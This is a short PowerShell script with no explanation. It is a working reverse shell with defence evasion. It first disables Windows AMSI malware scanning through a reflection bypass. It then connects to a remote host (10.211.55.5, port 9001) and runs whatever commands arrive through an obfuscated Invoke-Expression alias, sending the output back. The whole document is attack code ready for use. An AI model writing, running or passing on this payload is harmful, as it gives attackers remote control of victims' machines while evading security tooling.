
$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$s.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)


$i = "10.211.55.5"
$p = 9001


$t = [System.Net.Sockets.TcpClient]::new($i, $p)
$z = $t.GetStream()


Set-Alias -Name 'sh' -Value ([char]73+[char]101+[char]120) -Option AllScope


$d = New-Object Byte[] 65536
While(($len = $z.Read($d, 0, $d.Length)) -ne 0) {
    $c = [System.Text.Encoding]::ASCII.GetString($d, 0, $len)
    
   
    $o = try {
Sh $c 2>&1 | Out-String
    } catch {
        $_.Exception.Message
    }
    
   
    $f = $o + "PS " + (pwd).Path + "> "
    $b = [System.Text.Encoding]::ASCII.GetBytes($f)
    $z.Write($b, 0, $b.Length)
}
